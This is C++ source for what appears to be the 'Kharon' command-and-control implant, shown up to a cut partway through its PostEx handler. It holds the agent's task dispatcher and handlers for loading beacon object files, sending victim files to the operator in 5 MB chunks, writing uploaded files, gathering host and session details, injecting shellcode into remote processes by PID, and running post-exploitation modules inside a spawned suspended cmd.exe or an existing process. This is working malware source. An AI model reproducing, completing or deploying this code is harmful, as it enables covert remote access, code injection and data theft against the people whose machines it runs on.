#include <Kharon.h>

using namespace Root;

auto DECLFN Task::Dispatcher( VOID ) -> VOID {
    KhDbg("[====== Starting Dispatcher ======]");
    KhDbg("Initial heap allocation count: %d", Self->Hp->Count);

    PACKAGE* Package  = nullptr;
    PARSER*  Parser   = nullptr;
    PVOID    DataPsr  = nullptr;
    UINT64   PsrLen   = 0;
    PCHAR    TaskUUID = nullptr;
    BYTE     JobID    = 0;
    ULONG    TaskQtt  = 0;

    auto FinalRoutine = [&]( VOID ) {
        if ( Self->Jbs->ExecuteAll() ) {
            Self->Jbs->Send( Self->Jbs->PostJobs );
        }

        Self->Jbs->Cleanup();

        if ( DataPsr ) {
            hFree( DataPsr );
        }

        if ( Parser ) { 
            Self->Psr->Destroy( Parser );
        }

        if ( Self->Jbs->PostJobs ) {
            Self->Pkg->Destroy( Self->Jbs->PostJobs );
        }

        if ( Package ) {
            Self->Pkg->Destroy( Package );
        }

        KhDbg("Final heap allocation count: %d", Self->Hp->Count);
        KhDbg("[====== Dispatcher Finished ======]\n");
    };

    Self->Jbs->PostJobs = Self->Pkg->PostJobs();
    Package = Self->Pkg->NewTask();
    if ( ! Package ) {
        KhDbg("ERROR: Failed to create new task package");
        return FinalRoutine();
    }

    Parser = (PARSER*)hAlloc( sizeof(PARSER) );
    if ( ! Parser ) {
        KhDbg("ERROR: Failed to allocate parser memory");
        return FinalRoutine();
    }

    Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );

    if ( ! DataPsr || ! PsrLen ) {
        Self->Pkg->Int32( Self->Jbs->PostJobs, Self->Jbs->Count );
        KhDbg("ERROR: No data received or zero length");
        return FinalRoutine();
    }

    KhDbg("Received response %p [%d bytes]", DataPsr, PsrLen);

    Self->Psr->NewTask( Parser, DataPsr, PsrLen );
    if ( ! Parser->Original ) { return FinalRoutine(); }

    KhDbg("Parsed data %p [%d bytes]", Parser->Buffer, Parser->Length);

    JobID = Self->Psr->Byte( Parser );

    if ( JobID == Enm::Task::GetTask ) {
        KhDbg("Processing job ID: %d", JobID);
        TaskQtt = Self->Psr->Int32( Parser );
        KhDbg("Task quantity received: %d", TaskQtt);

        if ( TaskQtt > 0 ) {
            if ( ! Self->Jbs->PostJobs ) {
                KhDbg("ERROR: Failed to create post jobs package");
                return FinalRoutine();
            }
 
            Self->Pkg->Int32( Self->Jbs->PostJobs, TaskQtt + Self->Jbs->Count );

            for ( ULONG i = 0; i < TaskQtt; i++ ) {
                TaskUUID = Self->Psr->Str( Parser, 0 );
                if ( ! TaskUUID ) {
                    KhDbg("WARNING: Invalid TaskUUID at index %d", i);
                    continue;
                }

                KhDbg("Creating job for task UUID: %s", TaskUUID);
                KhDbg(
                    "Parser state: %p, buffer: %p, length: %d", 
                    Parser, Parser->Buffer, Parser->Length
                );

                JOBS* NewJob = Self->Jbs->Create( TaskUUID, Parser );
                if ( ! NewJob ) {
                    KhDbg("WARNING: Failed to create job for task %d", i);
                    continue;
                }
            }
        } else {
            Self->Pkg->Int32( Self->Jbs->PostJobs, Self->Jbs->Count );
        }
    }

    return FinalRoutine();
}


auto DECLFN Task::ExecBof(
    _In_ JOBS* Job
) -> ERROR_CODE {
    BOOL Success = FALSE;

    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    G_PACKAGE = Package;
    G_PARSER  = Parser;

    ULONG BofLen   = 0;
    PBYTE BofBuff  = Self->Psr->Bytes( Parser, &BofLen );
    ULONG BofCmdID = Self->Psr->Int32( Parser );
    ULONG BofArgc  = 0;
    PBYTE BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );

    KhDbg("bof id  : %d", BofCmdID);
    KhDbg("bof args: %p [%d bytes]", BofArgs, BofArgc);

    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );

    G_PACKAGE = nullptr;
    G_PARSER  = nullptr;

    if ( Success ) {
        return KhRetSuccess;
    } else {
        return KhGetError;
    }
}

auto DECLFN Task::ProcessDownloads(
    _In_ JOBS* Job
) -> ERROR_CODE {

    PACKAGE* Package = Job->Pkg;

    KhDbg("Processing Downloads task");

    INT8  Index    = -1;
    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Down[i].FileID || ! Str::LengthA( Self->Tsp->Down[i].FileID ) ) {
            Index = i; break;
        }
    }

    if (Index == -1) {
        Job->Clean = TRUE;
        return KhRetSuccess;
    }

    FILE_DOWNLOAD_EVENT Events[30] = { 0 };
    ULONG StartTcpLength = 0;

	for (INT i = 0; i < 30; i++) {
        if ( Self->Tsp->Down[i].FileID && Str::LengthA( Self->Tsp->Down[i].FileID ) ) {

            if (Self->Tsp->Down[i].CurChunk > Self->Tsp->Down[i].TotalChunks) {
                KhDbg("SHOULD NEVER BE REACHED");
                Self->Tsp->Down[i].FileID = "";
                continue;
            }

            ULONG chunksize = Self->Tsp->Down[i].ChunkSize;
            ULONG Offset = (Self->Tsp->Down[i].CurChunk - 1) * Self->Tsp->Down[i].ChunkSize;
            KhDbg("Reading chunk %d/%d for file ID %s at offset %lu", Self->Tsp->Down[i].CurChunk, Self->Tsp->Down[i].TotalChunks, Self->Tsp->Down[i].FileID, Offset);

            ULONG Result = (ULONG)Self->Krnl32.SetFilePointer(
                Self->Tsp->Down[i].FileHandle,
                (LONG)Offset,   // low-order 32 bits
                NULL,           // high-order 32 bits (must be NULL for <4GB)
                FILE_BEGIN
            );

            BYTE* FileBuffer = B_PTR( hAlloc( chunksize ) );
            ULONG BytesRead  = 0;

            if ( ! Self->Krnl32.ReadFile( Self->Tsp->Down[i].FileHandle, FileBuffer, chunksize, &BytesRead, 0 ) || BytesRead == 0 ) {
                CHAR* ErrorMsg = "Failed to read from file";
                KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);

                Self->Ntdll.NtClose( Self->Tsp->Down[i].FileHandle );
                hFree(FileBuffer);

                Events[StartTcpLength].FileID = Self->Tsp->Down[i].FileID;
                Events[StartTcpLength].ErrorCode = 1;
                CHAR* Reason = "CHUNK_READ_ERROR";
                Events[StartTcpLength].Reason = Reason;
                StartTcpLength++;

                if ( Self->Tsp->Down[i].Path ) hFree( Self->Tsp->Down[i].Path );
                Self->Tsp->Down[i].FileID = nullptr;
                Self->Tsp->Down[i].Path = nullptr;

                QuickErr( ErrorMsg );
                continue;
            }

            Events[StartTcpLength].FileID = Self->Tsp->Down[i].FileID;
            Events[StartTcpLength].ErrorCode = 0;
            Events[StartTcpLength].Data = FileBuffer;
            Events[StartTcpLength].DataLen = BytesRead;
            Events[StartTcpLength].CurChunk = Self->Tsp->Down[i].CurChunk;
            Events[StartTcpLength].TotalChunks = Self->Tsp->Down[i].TotalChunks;
            StartTcpLength++;

            BOOL IsFinalChunk = (Self->Tsp->Down[i].CurChunk == Self->Tsp->Down[i].TotalChunks);
            
            if ( ! IsFinalChunk ) {
                Self->Tsp->Down[i].CurChunk = Self->Tsp->Down[i].CurChunk + 1;
            } else {
                Self->Ntdll.NtClose(Self->Tsp->Down[i].FileHandle);
                
                if ( Self->Tsp->Down[i].Path ) hFree( Self->Tsp->Down[i].Path );
                Self->Tsp->Down[i].FileID = nullptr;
                Self->Tsp->Down[i].Path = nullptr;
                Self->Tsp->numDownloadTasks--;
            }
        }
    }

    Self->Pkg->Int32( Package, StartTcpLength );
    if( StartTcpLength == 0 ){
        Job->Clean = TRUE;
        return KhRetSuccess;
    }

    for (INT i = 0; i < StartTcpLength; i++) {
        if (Events[i].FileID && Str::LengthA(Events[i].FileID)) {
            Self->Pkg->Str(Job->Pkg, Events[i].FileID);
            Self->Pkg->Int32(Job->Pkg, Events[i].ErrorCode);

            if (Events[i].ErrorCode != 0) {
                KhDbg("Processing TaskPacking for - FileID: %s, Error code: %d", Events[i].FileID, Events[i].ErrorCode);
                Self->Pkg->Str(Job->Pkg, Events[i].Reason);
            } else {
                KhDbg("Processing TaskPacking for - FileID: %s, Error code: %d", Events[i].FileID, Events[i].ErrorCode);
                Self->Pkg->Int32(Job->Pkg, Events[i].DataLen);
                KhDbg("Data Length: %d", Events[i].DataLen);
                // KhDbg( "Job Package Bytes for FileID: %s",  Events[i].FileID);
                // for ( INT j = 0; j < Events[i].DataLen; j++ ) {
                //     KhDbg( "%02X ", (Events[i].Data)[j] );
                // }
                Self->Pkg->Bytes(Job->Pkg, Events[i].Data, Events[i].DataLen);
                Self->Pkg->Int32(Job->Pkg, Events[i].CurChunk);
                KhDbg("Current Chunk: %d", Events[i].CurChunk);
                Self->Pkg->Int32(Job->Pkg, Events[i].TotalChunks);
                KhDbg("Total Chunks: %d", Events[i].TotalChunks);
            }
        }
    }

    for (INT i = 0; i < StartTcpLength; i++) {
        if ( Events[i].Data && Events[i].ErrorCode == 0 ) {
            hFree( Events[i].Data );
        }
        
        if ( Events[i].FileID && 
             (Events[i].ErrorCode != 0 || Events[i].CurChunk == Events[i].TotalChunks) ) {
            hFree( Events[i].FileID );
        }
    }

    Job->Clean = FALSE;

    return KhRetSuccess;
}

auto DECLFN Task::Download(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package   = Job->Pkg;
    PARSER*  Parser    = Job->Psr;
    CHAR*    FileID    = nullptr;
    CHAR*    FilePath  = nullptr;
    ULONG    FileSize  = 0;
    ULONG    chunksize = 0x500000; // 5 MB

    FileID = Self->Psr->Str( Parser, 0 );
    if ( ! FileID || ! Str::LengthA( FileID ) ) {
        CHAR* ErrorMsg = "Invalid file ID";
        KhDbg("%s", ErrorMsg);
        
        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        CHAR* Reason = "INVALID_FILE_ID";
        Self->Pkg->Str( Package, Reason ); // Reason

        QuickErr( ErrorMsg );
        return KhRetSuccess;
    }

    FilePath = Self->Psr->Str( Parser, 0 );
    KhDbg("Download file Path: %s", FilePath);

    if ( ! FilePath || ! Str::LengthA( FilePath ) ) {
        CHAR* ErrorMsg = "Invalid file path";
        KhDbg("%s", ErrorMsg);

        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        CHAR* Reason = "INVALID_FILE_PATH";
        Self->Pkg->Str( Package, Reason ); // Reason

        QuickErr( ErrorMsg );
        return KhRetSuccess;
    }

    KhDbg("Download file path: %s", FilePath);

    HANDLE FileHandle = Self->Krnl32.CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

    if ( FileHandle == INVALID_HANDLE_VALUE ) {
        CHAR* ErrorMsg = "Failed to open file for reading";
        KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);

        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        CHAR* Reason = "INVALID_FILE_HANDLE";
        Self->Pkg->Str( Package, Reason ); // Reason

        QuickErr( ErrorMsg );
        return KhRetSuccess;
    }

    INT8  Index = -1;
    
    KhDbg("file id: %s", FileID);
    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Down[i].FileID || ! Str::LengthA( Self->Tsp->Down[i].FileID ) ) {
            Index = i; break;
        }
    }

    KhDbg("index: %d", Index);

    if (Index == -1) {
        CHAR* ErrorMsg = "Maximum concurrent uploads (30) reached";
        KhDbg("%s", ErrorMsg);

        Self->Pkg->Str( Package, FileID );
        Self->Pkg->Int32( Package, 1 ); // Error
        CHAR* Reason = "MAX_DOWNLOADS_REACHED";
        Self->Pkg->Str( Package, Reason ); // Reason

        QuickErr( ErrorMsg );
        Self->Ntdll.NtClose( FileHandle );
        return KhRetSuccess;
    }

    
    FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );

    ULONG FileIDLen = Str::LengthA( FileID );
    CHAR* FileIDCopy = (CHAR*)hAlloc( FileIDLen + 1 );
    Str::CopyA( FileIDCopy, FileID );

    ULONG FilePathLen = Str::LengthA( FilePath );
    CHAR* FilePathCopy = (CHAR*)hAlloc( FilePathLen + 1 );
    Str::CopyA( FilePathCopy, FilePath );

    Self->Tsp->Down[Index].FileID = FileIDCopy;
    Self->Tsp->Down[Index].ChunkSize = chunksize; 
    Self->Tsp->Down[Index].CurChunk = 1;
    Self->Tsp->Down[Index].TotalChunks = (FileSize + chunksize - 1) / chunksize;
    Self->Tsp->Down[Index].Path   = FilePathCopy;
    Self->Tsp->Down[Index].FileHandle = FileHandle;

    Self->Tsp->numDownloadTasks++;
    if(Self->Tsp->numDownloadTasks == 1){
        KhDbg("Adding Process Downloads job");
        PARSER* TmpPsrDownload = nullptr;
        BYTE*   tmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
        UINT16  cmdDownload    = (UINT16)Enm::Task::ProcessDownloads;
        JOBS*   NewJobDownload = nullptr;
        // 4-byte big-endian length
        tmpBufDownload[0] = (cmdDownload     ) & 0xFF;
        tmpBufDownload[1] = (cmdDownload >> 8) & 0xFF;

        TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
        if ( ! TmpPsrDownload ) {         
            KhDbg("ERROR: Failed to create TmpParser");
            return KhGetError;
        }
    
        Self->Psr->New( TmpPsrDownload, tmpBufDownload, sizeof(UINT16) );
        hFree(tmpBufDownload);
    
        NewJobDownload = Self->Jbs->Create( Self->Jbs->DownloadUUID, TmpPsrDownload, TRUE );
        if ( ! NewJobDownload ) {
            KhDbg("WARNING: Failed to create job for Process Download task");
            return KhGetError;
            hFree(tmpBufDownload);
        }
    }

    Self->Pkg->Str( Package, FileID );
    Self->Pkg->Int32( Package, 0 ); 
    Self->Pkg->Int64( Package, FileSize );
    Self->Pkg->Str( Package, FilePath );

    return KhRetSuccess;  
}

auto DECLFN Task::Upload(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;
    
    CHAR* FileID   = nullptr;
    CHAR* FilePath = nullptr;
    INT8  Index    = -1;

    ULONG UploadState = Self->Psr->Int32( Parser );

    KhDbg("Upload state: %d", UploadState);

    switch ( UploadState ) {
        case Enm::Up::Init: {
            FileID = Self->Psr->Str( Parser, 0 );
            KhDbg("file id: %s", FileID);
            for ( INT i = 0; i < 30; i++ ) {
                if ( ! Self->Tsp->Up[i].FileID || ! Str::LengthA( Self->Tsp->Up[i].FileID ) ) {
                    Index = i; break;
                }
            }

            KhDbg("index: %d", Index);

            if (Index == -1) {
                CHAR* ErrorMsg = "Maximum concurrent uploads (10) reached";
                KhDbg("%s", ErrorMsg);
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }
            KhDbg("index: %d", Index);

            FilePath = Self->Psr->Str(Parser, 0);

            KhDbg("file path: %s", FilePath);

            Self->Tsp->Up[Index].FileID = FileID;
            Self->Tsp->Up[Index].Path   = FilePath;
            Self->Tsp->Up[Index].CurChunk = 0;
            Self->Tsp->Up[Index].BytesReceived = 0;
            Self->Tsp->Up[Index].TotalChunks = 0; 

            Self->Pkg->Int32( Package, 1 ); // Start with chunk 1
            Self->Pkg->Str( Package, FileID );
            Self->Pkg->Str( Package, FilePath );
            Self->Pkg->Int32( Package, KH_CHUNK_SIZE );

            KhDbg("Init upload: ID=%s, Path=%s", FileID, FilePath);

            break;
        }
        case Enm::Up::Chunk: {
            FileID = Self->Psr->Str( Parser, 0 );
            KhDbg("file id: %s", FileID);
            if ( ! FileID ) {
                CHAR* ErrorMsg = "Invalid File ID"; KhDbg("%s", ErrorMsg); 
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }

            INT32 TotalChunks = Self->Psr->Int32( Parser );
            INT32 ChunkNumber = Self->Psr->Int32( Parser );
            INT32 ChunkSize   = Self->Psr->Int32( Parser );
            BYTE* ChunkData   = Self->Psr->Bytes( Parser, 0 );

            KhDbg("total: %d", TotalChunks);
            KhDbg("chunk number: %d", ChunkNumber);
            KhDbg("chunk size: %d", ChunkSize);
            KhDbg("chunk data p:  %p", ChunkData);

            INT FileIndex = -1;
            for ( INT i = 0; i < 30; i++ ) {
                if ( 
                    Self->Tsp->Up[i].FileID && 
                    Str::CompareA( FileID, Self->Tsp->Up[i].FileID ) == 0
                ) { FileIndex = i; break; }
            }

            if ( FileIndex == -1 ) {
                CHAR* ErrorMsg = "File ID not found";
                KhDbg("%s", ErrorMsg);
                QuickErr( ErrorMsg );
                return KhRetSuccess;
            }

            KhDbg("FIleIndex: %d", FileIndex);

            if (
                ! Self->Tsp->Up[FileIndex].FileHandle || Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE
            ) {
                Self->Tsp->Up[FileIndex].FileHandle = Self->Krnl32.CreateFileA(
                    Self->Tsp->Up[FileIndex].Path, FILE_APPEND_DATA,
                    FILE_SHARE_READ, nullptr, OPEN_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, nullptr
                );
                KhDbg("Created File Handle");
                

                if (Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE) {
                    CHAR* ErrorMsg = "Failed to create/open file";
                    KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                    QuickErr( ErrorMsg );
                    return KhRetSuccess;
                }
            }

            Self->Krnl32.SetFilePointer(
                Self->Tsp->Up[FileIndex].FileHandle,
                0, nullptr, FILE_END
            );

            DWORD bytesWritten;
            BOOL  writeResult = Self->Krnl32.WriteFile(
                Self->Tsp->Up[FileIndex].FileHandle,
                ChunkData, ChunkSize, &bytesWritten, nullptr
            );
            KhDbg("bytesWritten: %lu", bytesWritten);
            KhDbg("writeResult: %d", writeResult);

            if ( ! writeResult || bytesWritten != ChunkSize ) {
                CHAR* ErrorMsg = "Failed to write chunk to file";
                KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                QuickErr( ErrorMsg );
                
                if ( Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE ) {
                    Self->Ntdll.NtClose( Self->Tsp->Up[FileIndex].FileHandle );
                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
                }
                
                return KhRetSuccess;
            }

            Self->Tsp->Up[FileIndex].CurChunk       = ChunkNumber;
            Self->Tsp->Up[FileIndex].BytesReceived += bytesWritten;
            Self->Tsp->Up[FileIndex].TotalChunks    = TotalChunks;

            KhDbg("Chunk %d/%d (%d bytes) written to %s", 
                ChunkNumber, TotalChunks, bytesWritten, FileID);

            if ( ChunkNumber == TotalChunks || ChunkSize < KH_CHUNK_SIZE ) {
                KhDbg(
                    "Upload completed: %s (%d bytes total)", 
                    FileID, Self->Tsp->Up[FileIndex].BytesReceived 
                );

                if ( Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE ) {
                    Self->Ntdll.NtClose( Self->Tsp->Up[FileIndex].FileHandle );
                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
                }

                if ( Self->Tsp->Up[FileIndex].FileID ) {
                    hFree( Self->Tsp->Up[FileIndex].FileID );
                    Self->Tsp->Up[FileIndex].FileID = nullptr;
                }
                
                if ( Self->Tsp->Up[FileIndex].Path ) {
                    hFree( Self->Tsp->Up[FileIndex].Path );
                    Self->Tsp->Up[FileIndex].Path = nullptr;
                }
                Self->Tsp->Up[FileIndex].FileID = "";
                Self->Tsp->Up[FileIndex].CurChunk = 0;
                Self->Tsp->Up[FileIndex].BytesReceived = 0;
                Self->Tsp->Up[FileIndex].TotalChunks = 0;
            }

            break;
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::Info(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;

    Self->Pkg->Int32( Package, Self->Config.SleepTime );
    Self->Pkg->Int32( Package, Self->Config.Jitter );

    Self->Pkg->Int32( Package, Self->Config.Mask.TechniqueID );
    Self->Pkg->Int32( Package, Self->Config.Mask.Heap );
    Self->Pkg->Int64( Package, Self->Config.Mask.JmpGadget );
    Self->Pkg->Int64( Package, Self->Config.Mask.NtContinueGadget );

    Self->Pkg->Int32( Package, Self->Config.BofHook );
    Self->Pkg->Int32( Package, Self->Config.Syscall );

    Self->Pkg->Int32( Package, Self->Config.Ps.BlockDlls );
    Self->Pkg->Int32( Package, Self->Config.Ps.ParentID );
    Self->Pkg->Int32( Package, Self->Config.Ps.Pipe );

    Self->Pkg->Str( Package, Self->Config.Postex.ForkPipe );
    Self->Pkg->Str( Package, Self->Config.Postex.Spawnto );

    Self->Pkg->Str( Package, Self->Session.AgentID );
    Self->Pkg->Str( Package, Self->Session.ImageName );
    Self->Pkg->Str( Package, Self->Session.ImagePath );
    Self->Pkg->Str( Package, Self->Session.CommandLine );
    Self->Pkg->Int32( Package, Self->Session.ProcessID );
    Self->Pkg->Int32( Package, Self->Session.ThreadID );
    Self->Pkg->Int32( Package, Self->Session.ParentID );
    Self->Pkg->Int32( Package, Self->Session.Elevated );
    Self->Pkg->Int64( Package, Self->Session.HeapHandle );
    Self->Pkg->Int32( Package, Self->Session.ProcessArch );
    Self->Pkg->Int64( Package, Self->Session.Base.Start );
    Self->Pkg->Int32( Package, Self->Session.Base.Length );

    Self->Pkg->Str( Package, Self->Machine.UserName );
    Self->Pkg->Str( Package, Self->Machine.CompName );
    Self->Pkg->Str( Package, Self->Machine.DomName );
    Self->Pkg->Byte( Package, Self->Machine.OsArch );
    Self->Pkg->Int32( Package, Self->Machine.OsMjrV );
    Self->Pkg->Int32( Package, Self->Machine.OsMnrV );
    Self->Pkg->Int32( Package, Self->Machine.OsBuild );

    Self->Pkg->Int32( Package, Self->Config.KillDate.Enabled );
    Self->Pkg->Int32( Package, Self->Config.KillDate.SelfDelete );
    Self->Pkg->Int32( Package, Self->Config.KillDate.ExitProc );
    Self->Pkg->Int32( Package, Self->Config.KillDate.Day );
    Self->Pkg->Int32( Package, Self->Config.KillDate.Month );
    Self->Pkg->Int32( Package, Self->Config.KillDate.Year );

    Self->Pkg->Int32( Package, Self->Config.Injection.Alloc );
    Self->Pkg->Int32( Package, Self->Config.Injection.Write );

    KhDbg("Info task completed successfully");

    return KhRetSuccess;
}

auto DECLFN Task::ScInject(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PARSER*  Parser  = Job->Psr;
    PACKAGE* Package = Job->Pkg;

    ULONG    Length    = 0;
    BYTE*    Buffer    = Self->Psr->Bytes( Parser, &Length );
    ULONG    ProcessId = Self->Psr->Int32( Parser );
    INJ_OBJ* Object    = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );

    Object->ProcessId = ProcessId;

    if ( ! Self->Inj->Standard( Buffer, Length, nullptr, 0, Object ) ) {
        QuickErr( "Failed to inject into remote process" );
    }

    hFree( Object );

    return KhGetError;
}

auto DECLFN Task::PostEx(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PARSER*  Parser  = Job->Psr;
    PACKAGE* Package = Job->Pkg;
    CHAR*    DefUUID = Job->UUID;

    HANDLE   ReadPipe     = INVALID_HANDLE_VALUE;
    HANDLE   WritePipe    = INVALID_HANDLE_VALUE;
    HANDLE   BackupHandle = INVALID_HANDLE_VALUE;
    HANDLE   PipeHandle   = INVALID_HANDLE_VALUE;

    INJ_OBJ* Object = nullptr;

    PROCESS_INFORMATION PsInfo = { 0 };

    BYTE* Output = nullptr;

    ULONG ExecMethod   = Self->Psr->Int32( Parser );
    ULONG ForkCategory = Self->Psr->Int32( Parser );
    ULONG ExplicitPid  = Self->Psr->Int32( Parser );

    ULONG Length  = 0;
    BYTE* Buffer  = Self->Psr->Bytes( Parser, &Length );
    ULONG ArgLen  = 0;
    BYTE* ArgBuff = Self->Psr->Bytes( Parser, &ArgLen );

    Object = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );

    Object->ExecMethod   = ExecMethod;
    Object->ForkCategory = ForkCategory;
    Object->ExplicitPid  = ExplicitPid;

    auto CleanupAndReturn = [&]( ERROR_CODE ErrorCode = KhGetError ) -> ERROR_CODE {
        if ( Output )      hFree( Output );
        if ( PipeHandle   != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( PipeHandle );
        if ( WritePipe    != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( WritePipe );
        if ( ReadPipe     != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ReadPipe );
        if ( BackupHandle != INVALID_HANDLE_VALUE ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupHandle );
        if ( PsInfo.hProcess ) {
            Self->Krnl32.TerminateProcess( PsInfo.hProcess, EXIT_SUCCESS );
            if ( PsInfo.hProcess ) Self->Ntdll.NtClose( PsInfo.hProcess );
            if ( PsInfo.hThread  ) Self->Ntdll.NtClose( PsInfo.hThread  );
        }
        if ( Object ) {
            if ( Object->BaseAddress  ) Self->Mm->Free( Object->BaseAddress, Length + ArgLen, MEM_RELEASE, Object->PsHandle );
            if ( Object->ThreadHandle ) Self->Ntdll.NtClose( Object->ThreadHandle );
            
            hFree( Object );
        } 
        
        return ErrorCode;
    };

    if ( ExecMethod == KH_METHOD_INLINE ) {
        SECURITY_ATTRIBUTES SecAttr = { 
            .nLength = sizeof(SECURITY_ATTRIBUTES), 
            .lpSecurityDescriptor = nullptr,
            .bInheritHandle = TRUE
        };

        if ( ! Self->Krnl32.CreatePipe( &ReadPipe, &WritePipe, &SecAttr, PIPE_BUFFER_LENGTH ) ) {
            QuickErr( "Failed to create pipe" );
            return CleanupAndReturn();
        }

        BackupHandle = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
        Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, WritePipe );

        Object->PsHandle = NtCurrentProcess();
        Object->Persist  = TRUE;

        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Object ) ) {
            QuickErr( "Failed to inject post-ex module: %d", KhGetError);
            return CleanupAndReturn();
        }

        KhDbg("injected");

        DWORD waitResult = Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, 15 * 1000 );
        if (waitResult == WAIT_TIMEOUT) {
            KhDbg("Thread timeout");
        } else {
            KhDbg("thread finished normally");
        }

        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );

        KhDbg("closing write pipe");
        Self->Ntdll.NtClose( WritePipe );
        WritePipe = INVALID_HANDLE_VALUE;
        KhDbg("write pipe closed");

        ULONG BytesAvail = 0;
        ULONG TotalBytesAvail = 0;
        ULONG BytesLeftThisMessage = 0;
        
        BOOL peekResult = Self->Krnl32.PeekNamedPipe( 
            ReadPipe, nullptr, 0, nullptr, &BytesAvail, &BytesLeftThisMessage 
        );
        
        KhDbg("PeekNamedPipe result: %d, BytesAvail: %d, TotalBytesAvail: %d, BytesLeftThisMessage: %d", 
            peekResult, BytesAvail, TotalBytesAvail, BytesLeftThisMessage);

        if ( BytesAvail > 0 ) {
            KhDbg("pipe has data: %d bytes", BytesAvail);
            Output = (BYTE*)hAlloc( BytesAvail );
            if ( Output ) {
                ULONG BytesRead = 0;
                if ( Self->Krnl32.ReadFile( ReadPipe, Output, BytesAvail, &BytesRead, nullptr ) ) {
                    KhDbg("read file success: %d bytes", BytesRead);
                    if (BytesRead > 0) {
                        QuickOut( Job->CmdID, Output, BytesRead );
                    } else {
                        KhDbg("read file returned 0 bytes");
                    }
                } else {
                    DWORD readError = KhGetError;
                    KhDbg("read file failed: %d", readError);
                }
            }
        } else {
            KhDbg("no data available in pipe");
            
            BYTE  smallBuffer[1024];
            ULONG smallBytesRead = 0;
            if ( Self->Krnl32.ReadFile(ReadPipe, smallBuffer, sizeof( smallBuffer ), &smallBytesRead, nullptr ) ) {
                if ( smallBytesRead > 0 ) {
                    KhDbg("surprise! actually read %d bytes", smallBytesRead);
                    QuickOut( Job->CmdID, smallBuffer, smallBytesRead);
                }
            } else {
                DWORD lastError = KhGetError;
                KhDbg("final read attempt failed: %d", lastError);
            }
        }
    } else if ( ExecMethod == KH_METHOD_FORK ) {

        if(ForkCategory == KH_INJECT_SPAWN){
            Self->Config.Ps.Pipe = FALSE;
    
            if ( ! Self->Ps->Create( "C:\\windows\\system32\\cmd.exe", TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &PsInfo ) ) {
                QuickErr( "Failed in process creation: %d", KhGetError );
                return CleanupAndReturn( KhGetError );
            }
    
            KhDbg( "postex module running at pid %d tid %d", PsInfo.dwProcessId, PsInfo.dwThreadId );
    
            Self->Config.Ps.Pipe = TRUE;
    
            Object->Persist      = TRUE;
            Object->ProcessId    = PsInfo.dwProcessId;
            Object->PsHandle     = PsInfo.hProcess;
        } else {
            // KH_INJECT_EXPLICIT: Inject into existing process by PID
            ULONG PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
            KhDbg( "Opening target process PID %d", ExplicitPid );
            HANDLE hProcess = Self->Ps->Open( PsOpenFlags, FALSE, ExplicitPid );
            
            if ( ! hProcess || hProcess == INVALID_HANDLE_VALUE ) {
                KhDbg( "Failed to open target process PID %d: %d", ExplicitPid, KhGetError );
                QuickErr( "Failed to open target process PID" );
                return CleanupAndReturn( KhGetError );
            }
            
            KhDbg( "postex module injecting into existing process pid %d", ExplicitPid );
            
            Object->Persist      = TRUE;
            Object->ProcessId    = ExplicitPid;
            Object->PsHandle     = hProcess;
        }


        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Object ) ) {
            QuickErr( "Injection failed in fork mode\n" );
            return CleanupAndReturn( KhGetError );
        }

        KhDbg("Injection completed, shellcode is now creating named pipe");

        // Resume the main thread so CLR can initialize properly
        KhDbg("Resuming main thread (handle=%p)", PsInfo.hThread);
        DWORD suspendCount = Self->Krnl32.ResumeThread( PsInfo.hThread );
        KhDbg("Main thread resumed, previous suspend count=%d", suspendCount);

